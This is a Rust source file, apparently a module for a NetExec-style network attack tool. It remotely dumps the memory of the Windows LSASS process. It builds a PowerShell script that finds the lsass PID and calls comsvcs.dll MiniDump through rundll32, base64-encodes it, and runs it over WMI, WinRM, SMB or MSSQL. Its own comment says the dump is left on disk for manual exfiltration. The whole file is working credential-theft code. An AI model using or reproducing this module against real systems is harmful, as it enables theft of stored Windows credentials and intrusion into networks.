//! # lsassy — Remote LSASS Memory Dumping Module
//!
//! Executes a PowerShell snippet to dynamically discover the `lsass.exe` PID
//! and abuses the `comsvcs.dll` LOLBin to create a MiniDump of the process
//! on the target's disk, outputting the path for manual exfiltration.

use anyhow::Result;
use async_trait::async_trait;
use nxc_protocols::{NxcProtocol, NxcSession};
use uuid::Uuid;

use crate::{ModuleOption, ModuleOptions, ModuleResult, NxcModule};

pub struct LsassyModule;

impl LsassyModule {
    pub fn new() -> Self {
        Self
    }
}

impl Default for LsassyModule {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl NxcModule for LsassyModule {
    fn name(&self) -> &'static str {
        "lsassy"
    }

    fn description(&self) -> &'static str {
        "Remotely dump LSASS process memory using comsvcs.dll"
    }

    fn supported_protocols(&self) -> &[&str] {
        &["wmi", "winrm", "smb", "mssql"]
    }

    fn options(&self) -> Vec<ModuleOption> {
        vec![ModuleOption {
            name: "PATH".to_string(),
            description: "Directory to save the dump (default: 'C:\\Windows\\Temp')".to_string(),
            required: false,
            default: Some("C:\\Windows\\Temp".to_string()),
        }]
    }

    async fn run(
        &self,
        session: &mut dyn NxcSession,
        opts: &ModuleOptions,
    ) -> Result<ModuleResult> {
        let dump_dir = opts
            .get("PATH")
            .map(|s| s.as_str())
            .unwrap_or("C:\\Windows\\Temp");
        let dump_filename = format!("{}\\lsass_{}.dmp", dump_dir, Uuid::new_v4().simple());

        // PowerShell payload to find LSASS PID and dump it using comsvcs.dll Minidump
        let script = format!(
            r#"
$ErrorActionPreference = 'SilentlyContinue';
$pidLsass = (Get-Process lsass).Id;
if (!$pidLsass) {{
    Write-Output 'DEBUG_ERR: lsass.exe process not found';
    exit 1;
}}
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pidLsass "{}" full;
Start-Sleep -Seconds 2;
if (Test-Path "{}") {{
    $sz = (Get-Item "{}").length / 1MB;
    Write-Output "DEBUG_OK: LSASS dumped successfully to {} ($([math]::Round($sz, 2)) MB)";
}} else {{
    Write-Output 'DEBUG_ERR: Failed to dump LSASS. Check permissions or AV/EDR interference.';
}}
"#,
            dump_filename, dump_filename, dump_filename, dump_filename
        );

        let b64_script = base64::Engine::encode(
            &base64::engine::general_purpose::STANDARD,
            script
                .encode_utf16()
                .flat_map(|u| u.to_le_bytes())
                .collect::<Vec<u8>>(),
        );
        let cmd = format!("powershell -e {}", b64_script);

        // Execute via the active protocol
        let output = match session.protocol() {
            "wmi" => {
                let proto = nxc_protocols::wmi::WmiProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "winrm" => {
                let proto = nxc_protocols::winrm::WinrmProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "smb" => {
                let proto = nxc_protocols::smb::SmbProtocol::new();
                proto.execute(session, &cmd).await?
            }
            "mssql" => {
                let proto = nxc_protocols::mssql::MssqlProtocol::new();
                proto.execute(session, &cmd).await?
            }
            _ => {
                return Err(anyhow::anyhow!(
                    "Protocol {} does not support execution",
                    session.protocol()
                ))
            }
        };

        // Parse Output
        let stdout = output.stdout.trim().to_string();
        let success = stdout.contains("DEBUG_OK");

        // Strip the DEBUG_OK / DEBUG_ERR tags for clean output
        let clean_output = stdout.replace("DEBUG_OK: ", "").replace("DEBUG_ERR: ", "");

        Ok(ModuleResult {
            credentials: vec![],
            success,
            output: clean_output.clone(),
            data: serde_json::json!({
                "dump_path": dump_filename,
                "success": success,
                "raw_output": stdout
            }),
        })
    }
}
